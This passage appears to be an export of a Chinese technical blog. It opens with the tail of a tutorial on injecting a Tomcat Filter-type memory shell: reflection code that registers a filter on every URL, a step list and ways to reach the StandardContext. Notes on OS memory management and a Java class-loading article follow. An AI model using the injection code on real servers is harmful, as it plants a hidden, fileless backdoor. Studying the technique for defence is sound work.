获取filterConfig并添加到filterConfigs</span></span><br><span class="line">            System.out.println(<span class="string">&quot;获取filterConfig并添加到filterConfigs&quot;</span>);</span><br><span class="line">            Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            System.out.println(1);</span></span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> declaredConstructor.newInstance(context1, filterDef);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            System.out.println(2);</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) filterConfigs.get(context1);</span><br><span class="line">            map.put(filterName, applicationFilterConfig);</span><br><span class="line"><span class="comment">//            将filterMap添加到StandardContext</span></span><br><span class="line">            System.out.println(<span class="string">&quot;将filterMap添加到StandardContext&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setFilterName(filterName);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            context1.addFilterMapBefore(filterMap);</span><br><span class="line">            System.out.println(<span class="string">&quot;内存马注入成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>要实现一个Filter类型的内存马，必要要完成以下的步骤</p>
<ul>
<li>获取StandardContext对象</li>
<li>写一个恶意FIlter</li>
<li>将恶意Filter加入到FilterDef中</li>
<li>将FIlterDef加入到FilterDefs中</li>
<li>将FilterDefs封装到FilterConfig中</li>
<li>将FilterCOnfig封装到FilterConfigs中</li>
<li>添加FIlter Parttern</li>
</ul>
<p>首先要获取Standard对象<br>利用IDEA的Evaluate工具我们可以知道req.getSession().getServletContext()的执行结果是一个ApplicationContextFacade对象，在其中有一个Context属性为APplicationContext类型的对象，这个APplicationContext类型的对象中有有一个属性context为StrandardContext类型的对象，也就是我们需要的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b4d18b39f0e89dee214586de0bf6155c.png" alt="在这里插入图片描述"><br>所以我们利用两次反射就可以获取到该StandardContext对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext1</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">context = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">context2</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context2.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext1);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) context2.get(applicationContext);</span><br></pre></td></tr></table></figure>
<p>还有另一种获取到StandardContext对象的方式，可以直接通过request对象获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">request</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">request.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) request.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure>
<p>嗯，就这么多想说的，后面的看代码就好了，主要就是按照上面的步骤来注入就行了，这里注意恶意的Filter类必须显式的重写init与destory方法，否则你会发现怎么都注入不成功，当然这都是我踩过的坑，浪费了我很多时间。。。</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
        <tag>内存马</tag>
        <tag>filter</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统内存管理</title>
    <url>/archives/3c5272d9.html</url>
    <content><![CDATA[<h1 id="连续内存管理"><a href="#连续内存管理" class="headerlink" title="连续内存管理"></a>连续内存管理</h1><h2 id="最优算法"><a href="#最优算法" class="headerlink" title="最优算法"></a>最优算法</h2><p>寻找与所需内存最相近的快</p>
<h2 id="最差内存算法"><a href="#最差内存算法" class="headerlink" title="最差内存算法"></a>最差内存算法</h2><p>找最大的空闲块</p>
<h2 id="最近内存算法"><a href="#最近内存算法" class="headerlink" title="最近内存算法"></a>最近内存算法</h2><p>找最近的可用空闲块</p>
<h2 id="碎片管理"><a href="#碎片管理" class="headerlink" title="碎片管理"></a>碎片管理</h2><p>上述三种算法均无法解决内存中出现的内碎片与外碎片问题，开头通过压缩算法与交换算法来进行缓解。</p>
<h1 id="非连续内存管理"><a href="#非连续内存管理" class="headerlink" title="非连续内存管理"></a>非连续内存管理</h1><h2 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h2><p>通过段号与段内偏移来实现虚拟内存地址与物理内存地址之间的映射，分段算法段的大小不是固定的是可变的。</p>
<h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><h3 id="正向页表"><a href="#正向页表" class="headerlink" title="正向页表"></a>正向页表</h3><p>通过逻辑内存地址查找物理内存地址，即通过页号查找帧号。<br>通过页表来管理内存，页表中存储了页号与帧号的映射关系，CPU通过虚拟内存的页号来查找对应物理内存地址的帧号，然后加上偏移地址来获取物理内存地址<br>页表的大小是固定的</p>
<h3 id="反向页表"><a href="#反向页表" class="headerlink" title="反向页表"></a>反向页表</h3><p>通过帧号来查找页号</p>
<h1 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h1><h2 id="覆盖技术"><a href="#覆盖技术" class="headerlink" title="覆盖技术"></a>覆盖技术</h2><p>由程序员决定，哪些模块先被加载到内存中，从而实现内存使用的优化</p>
<h2 id="交换技术"><a href="#交换技术" class="headerlink" title="交换技术"></a>交换技术</h2><p>将不使用的程序换出道硬盘中</p>
<h2 id="虚拟内存-1"><a href="#虚拟内存-1" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>将程序的一部分 不使用的内容放到硬盘中</p>
<h3 id="最优页面置换算法"><a href="#最优页面置换算法" class="headerlink" title="最优页面置换算法"></a>最优页面置换算法</h3><p>置换到下一次使用时间最长的页。因无法的值下一次使用的时间，所以该算法多用来作为衡量其他算法效果的标准</p>
<h3 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h3><p>先使用的页被最先置换</p>
<h3 id="最长未使用时间算法"><a href="#最长未使用时间算法" class="headerlink" title="最长未使用时间算法"></a>最长未使用时间算法</h3><p>维护一个链表或者栈存放每一个页被使用的顺序，每次都将最长时间未被使用的页置换出去。每一次访问不同的页都将查询一次链表并更换顺序，开销较大</p>
<h3 id="时钟置换算法"><a href="#时钟置换算法" class="headerlink" title="时钟置换算法"></a>时钟置换算法</h3><p>维护一个环形链表，每一个位置上记录某一个页表在一定时间内是否被访问，维护一个指针，没当发生页表访问时将标志位置为1表示该页表被访问过了，当发生缺页中断时，该指针按照一定方向移动，如果当前页表的标志位为1，则将其置为0，再访问下一个位置，直到找到标志位为0的页表，并将该页表置换出去。</p>
<h3 id="最不常用算法"><a href="#最不常用算法" class="headerlink" title="最不常用算法"></a>最不常用算法</h3><p>淘汰使用次数最少的页</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>内存管理</tag>
        <tag>页表</tag>
        <tag>虚拟内存</tag>
        <tag>内存交换</tag>
      </tags>
  </entry>
  <entry>
    <title>浅出理解java类加载机制</title>
    <url>/archives/9b259762.html</url>
    <content><![CDATA[<blockquote>
<p>预防针先打着，这篇文章我准备搬大部分，不要骂我</p>
</blockquote>
<p>参考链接：<br><a href="https://blog.csdn.net/javazejian/article/details/73413292">深入理解Java类加载器(ClassLoader)</a><br><a href="https://zhuanlan.zhihu.com/p/25228545">Java类加载机制</a><br><a href="https://www.cnblogs.com/czwbig/p/11127222.html">深入理解Java类加载</a></p>
<h1 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h1><blockquote>
<p>没有条理，只做记录 </p>
</blockquote>
<p>Java程序运行时，系统一直对所有的对象进行这所谓的运行时类型标识。这项信息记录了每个对象所属的类。虚拟机通常使用该信息去选择正确的对象与方法执行，而用来保存这些类型信息的类就是Class类。Class封装一个对象和接口运行时的状态，当加载一个类的时候，Class类的对象就被创建了，也就是说，一个Class类的对象封装了一个类的类型信息，可以通过该对该对象的操作来实现对类的操作，这就是反射的原理。<br>既然Class类的对象封装了一个类的信息，这些信息一般包括类名、实现的接口、父类、成员方法、成员变量、注解等信息，也就是说，我们可以操作这些信息。<br>Class类的每一个实例都代表着一个运行中的类<br>Class类没有公有的构造方法，这也就意味着其不能通过new的方式来创建一个实例，Class类的对象是由jvm来创建的。<br>同时需要知道在JVM中，每个类只有唯一的一个Class对象，而标识一个唯一的类是通过他的完全限定名以及加载他的类加载器。在运行程序的时候，JVM首先会在缓存中判断当前类是不是已经被加载了，也就是findLoadedClass方法。如果没有加载，然后会将加载的权限交给当前类加载器的父类加载器加载，父类加载器会继续向上递交加载权限，知道某一级加载器的父类为null之后，该类的加载权限会被交给启动类加载器，启动类加载器如果不能加载该类，则向下一次按相反的顺序移交加载权限，直到某一级成功加载该类，这就是java的双亲委派机制，下面我们会从代码层面观察该机制。类加载器加载类是通过loadClass方法实现的。在loadClass方法中类加载最下层调用了一个称为findClass的方法，该方法实现了将class文件加载到内存，然后再通过defineClass方法将字节码转换为一个java Class对象。<br>我们可以通过下面演示的集中方式获得一个Class对象</p>
<span id="more"></span>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassLoaderTest1</span> <span class="variable">classLoaderTest1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoaderTest1</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ClassLoaderTest1</span>&gt; aClass = classLoaderTest1.getClass();</span><br><span class="line">        Class&lt;ClassLoaderTest1&gt; classLoaderTest1Class = ClassLoaderTest1.class;</span><br><span class="line">        Class&lt;?&gt; aClass1 = Class.forName(<span class="string">&quot;com.armandhe.javabase.ClassLoaderTest1&quot;</span>);</span><br><span class="line">        System.out.println(aClass1 == classLoaderTest1Class);</span><br><span class="line">        System.out.println(aClass1 == aClass1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/2d78d0aedc7a41aa3edf16fb93accf19.png" alt="在这里插入图片描述"><br>我们看到通过三者获得同一个类的Class对象是一样的，这就验证了同一个类只有一个Class对象的结论，我们可以在看看他们的类加载器其实也是一样的：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7080f57b69b4ce44df7b01d962c299df.png" alt="在这里插入图片描述"><br>后面我们将会演示类加载器不一样的效果。<br>我们再看一下下面的效果：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/228af10ce4994de5f98b481360103e02.png" alt="在这里插入图片描述"><br>这里我们加载了两个名字不一样的类，当然他们的Class实例是不相等的，不过他们的类加载器是一样的，根据上面的理论，只要类加载器和完全限定名有一个不一样则两个类的Class实例就是不相等的。<br>可以用下面的图来描述：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/341916fed5b2790dc1eeff41a74a758c.png" alt="在这里插入图片描述"></p>
<h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><p>上面提到JVM在加载类的时候会先创建该类的Class类实例，该实例存储了与该类所有的字段、方法等信息，通过该实例就可以生成对应的类对象。在Java中Class实例是可以人工生成的，这一特性打通了人工生成类对象的桎梏，通过这一特性Java实现了反射机制。<br>所谓反射就是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能调用它的任意方法和属性；并且能改变他的属性。<br>关于java反射的详情就不说了，使用的话主要就是几个获取属性、方法、构造方法的方法。</p>
<h1 id="Java类加载"><a href="#Java类加载" class="headerlink" title="Java类加载"></a>Java类加载</h1><p>Java的类加载一般都要经过加载-&gt;验证-&gt;准备-&gt;解析-&gt;初始化五个阶段，当然一个类的完整声明周期应该还要包括使用域卸载。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4f036e073b0688a19eef09f7195bd5db.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>加载：类加载过程的一个阶段：通过一个类的完全限定查找此类字节码文件，并利用字节码文件创建一个Class对象</p>
</li>
<li><p>验证：目的在于确保Class文件的字节流中包含信息符合当前虚拟机要求，不会危害虚拟机自身安全。主要包括四种验证，文件格式验证，元数据验证，字节码验证，符号引用验证。</p>
</li>
<li><p>准备：为类变量(即static修饰的字段变量)分配内存并且设置该类变量的初始值即0(如static int i&#x3D;5;这里只将i初始化为0，至于5的值将在初始化时赋值)，这里不包含用final修饰的static，因为final在编译的时候就会分配了，注意这里不会为实例变量分配初始化，类变量会分配在方法区中，而实例变量是会随着对象一起分配到Java堆中。</p>
</li>
<li><p>解析：主要将常量池中的符号引用替换为直接引用的过程。符号引用就是一组符号来描述目标，可以是任何字面量，而直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。有类或接口的解析，字段解析，类方法解析，接口方法解析(这里涉及到字节码变量的引用，如需更详细了解，可参考《深入Java虚拟机》)。</p>
</li>
<li><p>初始化：类加载最后阶段，若该类具有超类，则对其进行初始化，执行静态初始化器和静态初始化成员变量(如前面只初始化了默认值的static变量将会在这个阶段赋值，成员变量也将被初始化)。</p>
</li>
</ul>
<p>加载后面的三个截断又被统称为连接阶段。<br>对验证阶段的说明如下：</p>
<ul>
<li>文件格式验证：如是否以幻数 0xCAFEBABE 开头、主、次版本号是否在当前虚拟机处理范围之内、常量合理性验证等。<br>此阶段保证输入的字节流能正确地解析并存储于方法区之内，格式上符合描述一个 Java类型信息的要求。</li>
<li>元数据验证：是否存在父类，父类的继承链是否正确，抽象类是否实现了其父类或接口之中要求实现的所有方法，字段、方法是否与父类产生矛盾等。<br>第二阶段，保证不存在不符合 Java 语言规范的元数据信息。</li>
<li>字节码验证：通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。例如保证跳转指令不会跳转到方法体以外的字节码指令上。</li>
<li>符号引用验证：在解析阶段中发生，保证可以将符号引用转化为直接引用。</li>
</ul>
<p>在初始化阶段，其实就是执行<code>&lt;clinit&gt;()</code>方法的过程，<code>&lt;clinit&gt;()</code> 方法是编译器在类中收集的类变量的赋值动作与静态代码块中的语句组合的一个方法，也就是说执行<code>&lt;clinit&gt;()</code> 方法就会对类变量进行赋值以及执行类中静态代码块中的语句。<code>&lt;clinit&gt;()</code> 方法并不会显示的调用父类的<code>&lt;clinit&gt;()</code> 方法而是隐式得调用，也就是说我们在初始化时手工去调用父类的<code>&lt;clinit&gt;()</code> 方法，jvm会保证父类的<code>&lt;clinit&gt;()</code> 方法在子类的<code>&lt;clinit&gt;()</code> 方法之前执行完毕。当然接口例外，几口不需要调用父类的<code>&lt;clinit&gt;()</code> 方法，除非在使用到父接口中的静态标量时才需要进行调用。<br>当一个类中没有静态代码块以及类变量的复制操作时，<code>&lt;clinit&gt;()</code> 可以不存在。<br>JVM会保证一个类的<code>&lt;clinit&gt;()</code> 方法在多线程中只被执行一次，当一个线程在执行<code>&lt;clinit&gt;()</code> 时其他线程都需阻塞等待，直到当前线程<code>&lt;clinit&gt;()</code> 执行完毕。</p>
<h2 id="类加载的时机"><a href="#类加载的时机" class="headerlink" title="类加载的时机"></a>类加载的时机</h2><p>对于初始化阶段，虚拟机规范规定了有且只有 5 种情况必须立即对类进行“初始化”（而加载、验证、准备自然需要在此之前开始）：</p>
<ul>
<li>遇到new、getstatic 和 putstatic 或 invokestatic 这4条字节码指令时，如果类没有进行过初始化，则需要先触发其初始化。对应场景是：使用 new 实例化对象、读取或设置一个类的静态字段（被 final 修饰、已在编译期把结果放入常量池的静态字段除外）、以及调用一个类的静态方法。</li>
<li>对类进行反射调用的时候，如果类没有进行过初始化，则需要先触发其初始化。</li>
<li>当初始化类的父类还没有进行过初始化，则需要先触发其父类的初始化。（而一个接口在初始化时，并不要求其父接口全部都完成了初始化）</li>
<li>虚拟机启动时，用户需要指定一个要执行的主类（包含 main() 方法的那个类），虚拟机会先初始化这个主类。</li>
<li>当使用 JDK 1.7 的动态语言支持时，如果一个 java.lang.invoke.MethodHandle 实例最后的解析结果 REF_getStatic、REF_putStatic、REF_invokeStatic 的方法句柄，并且这个方法句柄所对应的类没有进行过初始化，则需要先触发其初始化。<br>以上这 5 种场景中的行为称为对一个类进行主动引用。除此之外，所有引用类的方式都不会触发初始化，称为被动引用，例如：</li>
<li>通过子类引用父类的静态字段，不会导致子类初始化。</li>
<li>通过数组定义来引用类，不会触发此类的初始化。MyClass[] cs &#x3D; new MyClass[10];</li>
<li>常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化。</li>
</ul>
<h2 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h2><p>类加载就是加载器更具一个类的完全限定名来读取此类的二进制字节流到JVM中，然后转换为一个与目标类对应的Class实例对象。在JVM中提供了三种内置的类加载器，启动类加载器、扩展类加载器、应用类加载器。</p>
<h3 id="启动类加载器"><a href="#启动类加载器" class="headerlink" title="启动类加载器"></a>启动类加载器</h3><p>启动类加载器用来加载JVM自身需要的类，这个类加载器使用C++实现，没有父类，其父加载器为null，负责将%JAVAHOME%&#x2F;lib下面的核心类库或者-X bootclasspath参数指定路径下的jar包加载到内存中。启动类记载器只加载java、javax、sun等开头的类。如果现在我要加载一个java.lang.String的类，但该类不在上述目录里面，因为双亲委派机制的原因，其加载权限会被发送到启动类加载器，但是因为其不在上述目录下面，所以不会被加载。这就保证了java的核心类库不被污染与篡改，这就是双亲委派机制的魅力。</p>
<h3 id="扩展类加载器"><a href="#扩展类加载器" class="headerlink" title="扩展类加载器"></a>扩展类加载器</h3><p>扩展类加载器有ExtClassLoader实现，ExtClassLoader是sun.misc.Launcher的内部静态类。其负责加载%JAVA_HOME%&#x2F;lib&#x2F;ext目录下或者由命令-Djava.ext.jar指定的路径中的类库。</p>
<h3 id="系统类加载器"><a href="#系统类加载器" class="headerlink" title="系统类加载器"></a>系统类加载器</h3><p>也叫作应用类加载器，由sun.misc.Launcher$AppClassLoader实现。它负责加载系统类路径java -classpath或-D java.class.path 指定路径下的类库，也就是我们经常用到的classpath路径，开发者可以直接使用系统类加载器，一般情况下该类加载是程序中默认的类加载器，通过ClassLoader#getSystemClassLoader()方法可以获取到该类加载器。</p>
<h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>双亲委派模式要求除了顶层的启动类加载器外，其余的类加载器都应当有自己的父类加载器，请注意双亲委派模式中的父子关系并非通常所说的类继承关系，而是采用组合关系来复用父类加载器的相关代码，类加载器间的关系如下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e9f6babf2c9e05d5b3a8d7c37ebe03e9.png" alt="在这里插入图片描述"><br>双亲委派模式是在Java 1.2后引入的，其工作原理的是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载。<br>采用双亲委派模式的是好处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会被随意替换，假设通过网络传递一个名为java.lang.Integer的类，通过双亲委托模式传递到启动类加载器，而启动类加载器在核心Java API发现这个名字的类，发现该类已被加载，并不会重新加载网络传递的过来的java.lang.Integer，而直接返回已加载过的Integer.class，这样便可以防止核心API库被随意篡改。可能你会想，如果我们在classpath路径下自定义一个名为java.lang.SingleInterge类(该类是胡编的)呢？该类并不存在java.lang中，经过双亲委托模式，传递到启动类加载器中，由于父类加载器路径下并没有该类，所以不会加载，将反向委托给子类加载器加载，最终会通过系统类加载器加载该类。但是这样做是不允许，因为java.lang是核心API包，需要访问权限，强制加载将会报出如下异常</p>
<blockquote>
<p>java.lang.SecurityException: Prohibited package name: java.lang</p>
</blockquote>
<p>我们通过下图来认识双亲委派机制：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ec421d5e6bd36ebf52f4ab62f190c06.png" alt="在这里插入图片描述"><br>从图可以看出顶层的类加载器是ClassLoader类，它是一个抽象类，其后所有的类加载器都继承自ClassLoader（不包括启动类加载器），这里我们主要介绍ClassLoader中几个比较重要的方法。</p>
<h3 id="双亲委派的过程"><a href="#双亲委派的过程" class="headerlink" title="双亲委派的过程"></a>双亲委派的过程</h3><p>我们来看看AppClassLoader#loadClass的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String var1, <span class="type">boolean</span> var2) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var1.lastIndexOf(<span class="number">46</span>);</span><br><span class="line">            <span class="keyword">if</span> (var3 != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">SecurityManager</span> <span class="variable">var4</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">                <span class="keyword">if</span> (var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    var4.checkPackageAccess(var1.substring(<span class="number">0</span>, var3));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ucp.knownToNotExist(var1)) &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">this</span>.findLoadedClass(var1);</span><br><span class="line">                <span class="keyword">if</span> (var5 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var2) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.resolveClass(var5);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> var5;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(var1);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(var1, var2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>前面是建立了一个安全管理器啥的，具体啥意思咱也不懂，还没到那个地步。主要的代码是下面一个if判断。<br>首先通过findLoadedClass方法去缓存中查找当前类是否已经被家在过了，如果没有被加载过则调用super.laodClass方法去加载类，我们跟进super.loadClass方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>首先是获得了一把锁，具体干啥的咱也不知道。然后同样的调用了findLoadedClass方法去缓存中查找，如果没有找到则判断父类是否为空，如果不为空则调用父类的loadClass方法加载类，如果为空则调用启动类加载器加载类。如果仍然没有找到，借c&#x3D;&#x3D;null，则调用findClass方法。<br>而扩展类加载器的父类我们知道为null，那么其肯定会让启动类加载器去加载类。<br>那么为什么为null呢，看下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ExtClassLoader</span><span class="params">(File[] var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="built_in">super</span>(getExtURLs(var1), (ClassLoader)<span class="literal">null</span>, Launcher.factory);</span><br><span class="line">            SharedSecrets.getJavaNetAccess().getURLClassPath(<span class="built_in">this</span>).initLookupCache(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>这里调用了父类的构造方法，注意这里第二个参数为null，我们跟进去：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">URLClassLoader</span><span class="params">(URL[] urls, ClassLoader parent,</span></span><br><span class="line"><span class="params">                          URLStreamHandlerFactory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> <span class="title class_">URLClassPath</span>(urls, factory, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里我们看到继续调用了父类的构造方法，继续跟：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">SecureClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        initialized = <span 